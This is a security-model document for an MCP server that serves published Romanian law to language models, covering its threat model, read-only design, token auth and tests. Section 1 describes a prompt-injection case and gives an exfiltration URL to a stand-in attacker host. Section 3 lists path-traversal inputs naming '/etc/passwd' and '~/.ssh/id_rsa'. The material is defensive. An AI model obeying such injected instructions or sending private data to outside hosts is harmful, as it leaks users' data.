# Security model

jog-mcp is a network-capable process that hands text to a language model, so
it has to answer two questions: what can a caller make it do, and what can it
make a model do. Its properties are below, each with the test that pins it.

To report a vulnerability, open a GitHub security advisory on this repository
rather than a public issue.

---

## 1. It serves only public law, and that is the central decision

Every word in `acts/` is Romanian legislation already published in Monitorul
Oficial. The server serves nothing else, and that choice comes before every
other one in this document.

A client with this server attached almost certainly has web tools as well.
"Read private data, then send it somewhere" is the classic exfiltration pair.
An injected instruction can make a model with both a private corpus and a web
fetch tool send `https://attacker.example/?d=<private text>`. No tool is
misused, because fetching a URL is exactly what the web tool is for. With
published law on the reading side, the worst such an injection can steal is a
public document.

So **do not add private documents to this server** (internal procedures,
client files, notes) without a different threat model. Splitting the
private material into a separate server with no web-capable client is the
usual answer. It is a design decision, not a config change.

## 2. Read-only by construction, not by care

There is no tool that writes, and the server process needs no write access to
the repository. The corpus is refreshed by `jog-mcp-fetch`, a separate program
that a person runs. The server imports none of it.
`tests/test_lawlib.py::test_corpus_never_writes` checks that searching,
looking up and outlining leave the corpus byte-identical. Every tool is
annotated `readOnlyHint: true, destructiveHint: false`
(`tests/test_server.py::test_the_tools_are_the_documented_five_and_all_read_only`).

## 3. No tool argument ever reaches a path

`get_article`, `outline`, `search_law(act=…)` and `find_exact(act=…)` take an
act *reference*. It is matched against the dictionary of loaded acts and never
joined into a filesystem path. `../../acts.yaml`, `/etc/passwd` and
`~/.ssh/id_rsa` don't name an act, so they resolve to nothing and the tool
replies "No act matches". There is no path guard to get wrong, because no
path is built. This is pinned by `tests/test_lawlib.py::test_no_path_argument_can_escape`
and `tests/test_server.py::test_a_path_is_not_an_act`.

## 4. An ambiguous reference is refused, not guessed

"regulament" matches more than one act, so the server names the candidates
and asks which one was meant. A confident answer about the wrong act is the
costly failure here, worth one extra round trip to avoid
(`tests/test_server.py::test_an_ambiguous_act_is_a_question_back_not_a_guess`).

## 5. It never presents dead law as current, or hits for nonsense

A wrong citation isn't an attack, but it does the most real damage, so it is
defended against like one:

- **Repealed acts and articles are flagged on every result**, with the date
  and the replacing act, in the text the model reads
  (`tests/test_server.py::test_a_repealed_article_is_flagged_in_the_text_the_model_reads`).
  Partial repeals are flagged per article. `tests/test_corpus.py` checks the
  flags in `acts.yaml` against the portal's own "Abrogat." stamps.
- **Nonsense returns nothing.** The similarity fallback has a floor measured
  on this corpus. Without one, "zzzz nonexistent term" returned five
  confidently formatted articles
  (`tests/test_corpus.py::test_nonsense_finds_nothing`).
- **Staleness is visible.** Every result carries its consolidation and fetch
  date, and `list_acts` reports both. A quietly outdated corpus is worse than
  an empty one.
- **The server's instructions tell the model to cite the article, to say when
  the corpus doesn't cover a question, and to put a repeal warning in its
  first sentence.** That is guidance, not enforcement: a model can still
  ignore it.

## 6. HTTP mode: a shared bearer token, and that is only a floor

`--http` won't start without `JOG_MCP_TOKEN`
(`tests/test_server.py::test_http_mode_refuses_to_start_without_a_token`). It
compares the token in constant time on every request and rejects anything else
with 401 (`::test_http_mode_rejects_a_wrong_token`). What the token does not
do:

- **It can't say who asked.** Everyone shares one secret, and rotating it
  means telling everyone. Per-person identity or an audit trail needs OAuth
  and a user store. The MCP SDK supports that (`MCPServer(token_verifier=…)`);
  this server doesn't use it.
- **It doesn't encrypt.** `--http` is plain HTTP. Put it behind a TLS
  terminator or on a private network such as a tailnet. A token sent over
  plain HTTP across the internet has been published.
- **It doesn't rate-limit.** The server spends no model budget, so the only
  cost of abuse is CPU. Revisit that before exposing it beyond a trusted
  network.

The default host is `127.0.0.1`.

## 7. The fetcher treats the portal as a third party

`jog-mcp-fetch` downloads only URLs built from the document IDs in
`acts.yaml`. It enforces a size cap per document and parses the HTML in
Python. No model ever fetches a page or sees raw HTML; only the parsed
statute text reaches a model, as data. Every refresh is a git diff to review
before committing, so a changed or tampered page shows up as a change to the
law before anyone serves it.

## Not defended against

- **A model that ignores its instructions.** The server makes citations
  checkable; checking them is the reader's job.
- **A compromised portal** serving altered text that passes review. The diff
  makes this visible, but it doesn't make it impossible.
- **A malicious client.** Every tool is read-only over public text, so a
  hostile caller can only read law and burn CPU.
